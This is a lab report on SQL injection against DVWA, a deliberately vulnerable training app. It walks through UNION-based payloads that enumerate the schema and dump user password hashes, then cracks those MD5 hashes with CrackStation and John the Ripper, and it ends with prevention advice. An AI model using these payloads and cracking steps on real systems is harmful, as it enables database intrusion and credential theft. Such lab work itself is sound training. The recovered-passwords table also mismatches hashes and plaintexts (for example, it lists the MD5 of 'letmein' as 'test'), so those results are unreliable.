📝 SQL Injection and MD5 Hash Cracking Lab Report

1️⃣ Objective
	•	Understand the principle of SQL Injection vulnerabilities.
	•	Learn how to exploit SQL Injection to enumerate database, tables, columns, and dump data.
	•	Identify MD5 password hashes.
	•	Practice cracking MD5 hashes using tools and techniques.

⸻

2️⃣ Environment

Item	Details
OS	Kali Linux / macOS
Target	DVWA 1.10 (Security Level: Low)
Browser	Chrome / Firefox
Tools	Browser / Burp Suite / Kibana (optional) / John the Ripper


⸻

3️⃣ Procedure

3.1 Verify SQL Injection

Access the target page:

http://<dvwa>/vulnerabilities/sqli/?id=1&Submit=Submit

Test payload:

id=1'

✅ SQL syntax error is displayed → confirmed injectable.

⸻

3.2 Determine Column Count

Payloads:

id=1' ORDER BY 1-- -
id=1' ORDER BY 2-- -

✅ Increase column index until an error appears → determines the number of columns (in this case, 2).

⸻

3.3 Enumerate Databases

Payload:

id=1' UNION SELECT schema_name, null FROM information_schema.schemata-- -

Output:
	•	information_schema
	•	dvwa

⸻

3.4 Enumerate Tables

Payload:

id=1' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='dvwa'-- -

Output:
	•	guestbook
	•	users
	•	…

⸻

3.5 Enumerate Columns

Payload:

id=1' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'-- -

Output:
	•	user_id
	•	first_name
	•	last_name
	•	password
	•	…

⸻

3.6 Dump Data

Payload:

id=1' UNION SELECT concat(first_name,' ',last_name), password FROM users-- -

Output:

User Name	Password (MD5)
admin admin	5f4dcc3b5aa765d61d8327deb882cf99
Gordon Brown	e99a18c428cb38d5f260853678922e03
Hack Me	8d3533d75ae2c3966d7e0d4fcc69216b
Pablo Picasso	0d107d09f5bbe40cade3de5c71e9e9b7
Bob Smith	5f4dcc3b5aa765d61d8327deb882cf99


⸻

4️⃣ MD5 Hash Cracking

4.1 Identify Hash Type
	•	The hashes are 32-character hexadecimal strings → typical of MD5.

⸻

4.2 Online Cracking

Visit: https://crackstation.net/
Input:

5f4dcc3b5aa765d61d8327deb882cf99

Result:

password


⸻

4.3 Using John the Ripper

Save hashes to hashes.txt:

5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
…

Run:

john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

Recovered:

Hash	Plaintext
5f4dcc3b5aa765d61d8327deb882cf99	password
e99a18c428cb38d5f260853678922e03	abc123
8d3533d75ae2c3966d7e0d4fcc69216b	letmein
0d107d09f5bbe40cade3de5c71e9e9b7	test


⸻

5️⃣ Conclusion

✅ Successfully exploited SQL Injection to extract database information.
✅ Enumerated databases, tables, columns, and retrieved user credentials.
✅ Identified and cracked MD5 password hashes.

⸻

6️⃣ Recommendations
	•	Use prepared statements (parameterized queries) to prevent SQLi.
	•	Validate and sanitize user input strictly.
	•	Enforce least privilege on database accounts.
	•	Disable detailed error messages in production.
